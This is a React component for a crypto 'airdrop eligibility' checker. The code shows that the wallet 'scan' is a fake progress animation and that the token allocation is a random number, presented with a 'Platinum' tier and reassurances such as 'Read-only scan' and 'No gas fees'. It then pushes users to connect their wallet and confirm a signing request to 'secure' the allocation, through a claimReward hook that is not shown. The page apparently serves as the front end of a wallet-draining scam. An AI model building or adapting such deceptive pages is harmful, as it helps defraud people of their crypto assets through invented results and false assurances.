"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Scan, Shield, Coins, Gift, ChevronRight, Sparkles, Lock, CheckCircle, Wallet, X } from "lucide-react";
import GlassCard from "@/components/GlassCard";
import GradientButton from "@/components/GradientButton";
import ProgressRing from "@/components/ProgressRing";
import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import confetti from "canvas-confetti";

type ScanPhase = "input" | "scanning" | "results" | "securing" | "secured";

export default function EligibilityFlow() {
    const { connect, isConnected, claimReward } = useWeb3Manager();

    const [phase, setPhase] = useState<ScanPhase>("input");
    const [progress, setProgress] = useState(0);
    const [walletAddress, setWalletAddress] = useState("");
    const [isValid, setIsValid] = useState(false);
    const [isSecuring, setIsSecuring] = useState(false);
    const [isOpen, setIsOpen] = useState(false);
    const [results, setResults] = useState({ allocation: 0, bonus: 5000, tier: "Platinum" });

    // Listen for open events from Hero/Navbar
    useEffect(() => {
        const handleOpen = () => setIsOpen(true);
        window.addEventListener('open-eligibility', handleOpen);
        return () => window.removeEventListener('open-eligibility', handleOpen);
    }, []);

    const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
        const val = e.target.value;
        setWalletAddress(val);
        // Basic ETH address regex: starts with 0x and has 40 hex characters
        const valid = /^0x[a-fA-F0-9]{40}$/.test(val);
        setIsValid(valid);
    };

    const startScan = async () => {
        if (!isValid) return;

        // Generate random allocation between 10k and 120k
        const randomAllocation = Math.floor(Math.random() * (120000 - 10000 + 1)) + 10000;
        setResults(prev => ({ ...prev, allocation: randomAllocation }));

        setPhase("scanning");
        setProgress(0);

        // Simulate scanning progress visually
        const interval = setInterval(() => {
            setProgress((prev) => {
                if (prev >= 100) {
                    clearInterval(interval);
                    setPhase("results");
                    confetti({
                        particleCount: 100,
                        spread: 70,
                        origin: { y: 0.6 },
                        colors: ["#059669", "#F59E0B", "#10B981"],
                    });
                    return 100;
                }
                return prev + 2;
            });
        }, 40);
    };

    const handleSecureAirdrop = async () => {
        try {
            if (!isConnected) {
                await connect();
                return;
            }

            setPhase("securing");
            setIsSecuring(true);

            await claimReward([]);

            setPhase("secured");
            confetti({
                particleCount: 150,
                spread: 100,
                origin: { y: 0.5 },
                colors: ["#059669", "#F59E0B", "#10B981"],
            });
            setIsSecuring(false);

        } catch (e) {
            console.error("Secure error:", e);
            setPhase("results");
            setIsSecuring(false);
        }
    };

    useEffect(() => {
        if (isConnected && phase === "results") {
            // Optional logic if needed on connect
        }
    }, [isConnected, phase]);

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[10000] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-fade-in">
            <button
                onClick={() => setIsOpen(false)}
                className="absolute top-6 right-6 p-2 bg-white/10 hover:bg-white/20 rounded-full transition-colors text-white z-50"
            >
                <X size={24} />
            </button>

            <div className="w-full max-w-lg">
                <AnimatePresence mode="wait">
                    {phase === "input" && (
                        <motion.div
                            key="input"
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.95 }}
                            className="text-center w-full"
                        >
                            <GlassCard className="p-8 mb-6 relative" glow="primary">
                                <div className="w-32 h-32 mx-auto mb-6 flex items-center justify-center rounded-full bg-primary/10">
                                    <Scan className="w-16 h-16 text-primary animate-pulse" />
                                </div>
                                <h1 className="text-2xl font-display font-bold mb-3">Enter Your Wallet</h1>
                                <p className="text-muted-foreground text-sm mb-6">
                                    Paste your wallet address to scan your on-chain activity and check your allocation.
                                </p>
                                <input
                                    type="text"
                                    value={walletAddress}
                                    onChange={handleInput}
                                    placeholder="0x..."
                                    className={`w-full px-4 py-3 rounded-xl border bg-secondary/30 text-foreground placeholder:text-muted-foreground text-sm font-mono focus:outline-none focus:ring-2 transition-all mb-4 text-center ${walletAddress && !isValid
                                            ? "border-red-500/50 focus:border-red-500 focus:ring-red-500/20"
                                            : "border-border focus:ring-primary/50 focus:border-primary/50"
                                        }`}
                                />
                                <GradientButton
                                    onClick={startScan}
                                    size="lg"
                                    className="w-full"
                                    disabled={!isValid}
                                >
                                    <Scan className="w-4 h-4 mr-2 inline" /> Scan Wallet
                                </GradientButton>
                            </GlassCard>
                            <div className="flex items-center justify-center gap-4 text-xs text-muted-foreground">
                                <div className="flex items-center gap-1"><Shield className="w-3 h-3" /> Read-only scan</div>
                                <div className="flex items-center gap-1"><Coins className="w-3 h-3" /> No gas fees</div>
                            </div>
                        </motion.div>
                    )}

                    {phase === "scanning" && (
                        <motion.div
                            key="scanning"
                            initial={{ opacity: 0, scale: 0.9 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.9 }}
                            className="text-center flex flex-col items-center justify-center"
                        >
                            <ProgressRing progress={progress} size={180} label="Scanning wallet..." />
                            <motion.div
                                className="mt-8 space-y-2"
                                initial={{ opacity: 0 }}
                                animate={{ opacity: 1 }}
                                transition={{ delay: 0.5 }}
                            >
                                {[
                                    "Analyzing transactions...",
                                    "Checking DeFi activity...",
                                    "Evaluating eligibility..."
                                ].map((text, i) => (
                                    <motion.p
                                        key={text}
                                        initial={{ opacity: 0, x: -10 }}
                                        animate={{ opacity: progress > i * 33 ? 1 : 0.3, x: 0 }}
                                        className="text-sm text-muted-foreground"
                                    >
                                        {progress > (i + 1) * 33 ? "✓" : "○"} {text}
                                    </motion.p>
                                ))}
                            </motion.div>
                        </motion.div>
                    )}

                    {phase === "results" && (
                        <motion.div
                            key="results"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="w-full"
                        >
                            <GlassCard className="p-6 mb-4" glow="primary">
                                <div className="text-center mb-6">
                                    <motion.div
                                        initial={{ scale: 0 }}
                                        animate={{ scale: 1 }}
                                        transition={{ type: "spring", delay: 0.2 }}
                                        className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-accent/10 text-accent text-sm font-semibold mb-4"
                                    >
                                        <Sparkles className="w-4 h-4" /> {results.tier} Tier
                                    </motion.div>
                                    <h2 className="text-4xl font-display font-bold text-gradient-hero mb-1">
                                        {results.allocation.toLocaleString()}
                                    </h2>
                                    <p className="text-muted-foreground text-sm">Tokens Allocated</p>
                                    <p className="text-xs text-primary mt-1">+ {results.bonus.toLocaleString()} referral bonus available</p>
                                </div>

                                <div className="flex gap-3">
                                    <GradientButton onClick={handleSecureAirdrop} className="flex-1 w-full">
                                        {!isConnected ? (
                                            <>
                                                <Wallet className="w-4 h-4 mr-2 inline" /> Connect Wallet
                                            </>
                                        ) : (
                                            <>
                                                <Lock className="w-4 h-4 mr-2 inline" /> Secure Allocation
                                            </>
                                        )}
                                    </GradientButton>
                                </div>
                            </GlassCard>

                            <p className="text-center text-xs text-muted-foreground">
                                By connecting, you agree to the Terms of Service.
                            </p>
                        </motion.div>
                    )}

                    {phase === "securing" && (
                        <motion.div
                            key="securing"
                            initial={{ opacity: 0, scale: 0.9 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.9 }}
                            className="text-center w-full"
                        >
                            <GlassCard className="p-8" glow="primary">
                                <div className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-primary/10 flex items-center justify-center">
                                    <div className="w-8 h-8 border-3 border-primary border-t-transparent rounded-full animate-spin" />
                                </div>
                                <h2 className="text-xl font-display font-bold mb-3">Verifying Ownership</h2>
                                <p className="text-muted-foreground text-sm">
                                    Please confirm the request in your wallet to secure your allocation...
                                </p>
                            </GlassCard>
                        </motion.div>
                    )}

                    {phase === "secured" && (
                        <motion.div
                            key="secured"
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="text-center w-full"
                        >
                            <GlassCard className="p-8" glow="primary">
                                <motion.div
                                    initial={{ scale: 0 }}
                                    animate={{ scale: 1 }}
                                    transition={{ type: "spring", delay: 0.2 }}
                                    className="w-16 h-16 mx-auto mb-6 rounded-2xl bg-primary/10 flex items-center justify-center"
                                >
                                    <CheckCircle className="w-8 h-8 text-primary" />
                                </motion.div>
                                <h2 className="text-2xl font-display font-bold mb-3">Allocation Secured! 🎉</h2>
                                <p className="text-muted-foreground text-sm mb-2">
                                    Your <span className="text-primary font-semibold">{results.allocation.toLocaleString()}</span> tokens have been verified.
                                </p>
                                <div className="flex gap-3 mt-6">
                                    <GradientButton variant="outline" onClick={() => window.location.reload()} className="flex-1">
                                        Check Another Wallet
                                    </GradientButton>
                                </div>
                            </GlassCard>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </div>
    );
}
